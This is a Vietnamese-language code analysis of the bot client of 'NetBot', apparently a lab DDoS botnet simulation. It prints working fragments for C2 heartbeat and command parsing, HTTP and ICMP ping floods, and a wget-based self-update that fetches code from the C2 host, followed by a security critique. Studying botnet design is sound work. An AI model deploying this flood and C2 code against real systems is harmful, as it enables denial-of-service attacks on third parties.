# Phân tích netbot_client.py – Bot Client (Tiếng Việt)

> **File:** `netbot_client.py`  
> **Vai trò:** Bot client kết nối đến Command & Control (C2) server  
> **Dự án:** NetBot v1.0 – Mô phỏng botnet DDoS cho mục đích học tập  
> **Mục đích:** Phân tích mã nguồn, kiến trúc và hành vi bot

---

## 1. Tổng quan

`netbot_client.py` là agent (bot) của hệ thống NetBot.  
Chức năng chính:

- Kết nối tới C2 server qua TCP.
- Gửi heartbeat liên tục (`"HEARTBEAT"`).
- Nhận lệnh từ C2 theo format chuỗi.
- Chạy các kiểu tấn công mô phỏng:
  - **HTTP Flood**
  - **Ping Flood**
- Có khả năng **tự cập nhật (self-update)** thông qua `wget`.

Thiết kế đơn giản nhưng phù hợp mô phỏng botnet trong lab.

---

## 2. Import và ý nghĩa

```python
import socket
import time
import threading
import os
import urllib.request
import subprocess
import signal
```

- `socket`: kết nối TCP tới C2 server  
- `threading`: chạy engine tấn công song song  
- `urllib.request`: gửi HTTP request để flood  
- `subprocess`: chạy lệnh ping flood  
- `signal`, `os`: quản lý tiến trình hệ thống  

---

## 3. Lớp `launchAttack` – Engine tấn công

```python
class launchAttack:
    def __init__(self):
        self._running = True
```

### Hàm `run(self, n)`

Biến `n` là danh sách chuỗi từ C2:

```
n[0] = IP target
n[1] = Port target
n[2] = Command: LAUNCH/HALT/HOLD/UPDATE
n[3] = Attack Type: HTTPFLOOD / PINGFLOOD
n[4] = Delay
```

### 3.1 HTTP Flood

```python
if n[3]=="HTTPFLOOD":
    while self._running and attackSet:
        url = "http://"+n[0]+":"+n[1]+"/"
        urllib.request.urlopen(url).read()
        time.sleep(int(n[4]))
```

- Gửi HTTP GET liên tục  
- Không phân tích response  
- Delay dựa trên cấu hình từ C2  

---

### 3.2 Ping Flood

```python
if n[3]=="PINGFLOOD":
    url = "ping "+n[0]+" -i 0.0000001 -s 65000 > /dev/null 2>&1"
    pro = subprocess.Popen(url, shell=True, preexec_fn=os.setsid)
```

- Flood ICMP cực nhanh  
- Gói tin lớn: 65,000 bytes  
- Dừng bằng `os.killpg(os.getpgid(pro.pid), SIGTERM)`  

---

## 4. Biến global quan trọng

| Biến | Vai trò |
|------|---------|
| `attackSet` | Trạng thái bot đang tấn công |
| `updated` | Tránh update liên tục |
| `terminate` | Không dùng |

---

## 5. Kết nối đến C2 Server

```python
host = '192.168.0.174'
port = 5555
```

- Địa chỉ C2 hardcode  
- Nếu C2 không online → sleep và gọi lại Main()  

→ dễ gây lỗi đệ quy nhưng đơn giản cho PoC.

---

## 6. Vòng lặp Heartbeat

```python
s.send("HEARTBEAT".encode())
data = s.recv(1024)
data = data.decode().split('_')
```

C2 trả về:

```
IP_Port_Command_Type_Delay
```

Bot phân tích để lấy `attStatus`.

---

## 7. Xử lý các lệnh từ C2

### 7.1 LAUNCH – bắt đầu tấn công

```python
t = threading.Thread(target=c.run, args=(data,))
t.start()
attackSet = 1
```

---

### 7.2 HALT – dừng tấn công

```python
attackSet = 0
```

---

### 7.3 HOLD – tạm ngưng

Bot chờ 30s rồi hỏi lại.

---

### 7.4 UPDATE – tự cập nhật mã nguồn

```python
os.system("wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py")
```

- Ghi đè file bot hiện tại  
- Chỉ cho phép update 1 lần  

---

## 8. Nhận xét bảo mật

| Vấn đề | Giải thích |
|-------|------------|
| Không mã hóa | Lệnh từ C2 = plain text |
| Không xác thực | Bot tin mọi server trả về |
| RCE qua ping/wget | Nếu attacker giả mạo C2 → chiếm bot |
| Không lock biến | Race condition tiềm ẩn |
| Đệ quy Main() | Nguy cơ tràn stack |
| Không handle lỗi HTTP | Dễ crash khi target không phản hồi |

Dù vậy, code phù hợp mục tiêu nghiên cứu botnet.

---

## 9. Kết luận

`netbot_client.py` là một bot PoC hỗ trợ:

- Heartbeat → C2  
- Nhận lệnh điều khiển  
- Chạy đa dạng kiểu flood  
- Tự cập nhật từ C2  

Một ví dụ rõ ràng & đơn giản về kiến trúc botnet C2/Bot.

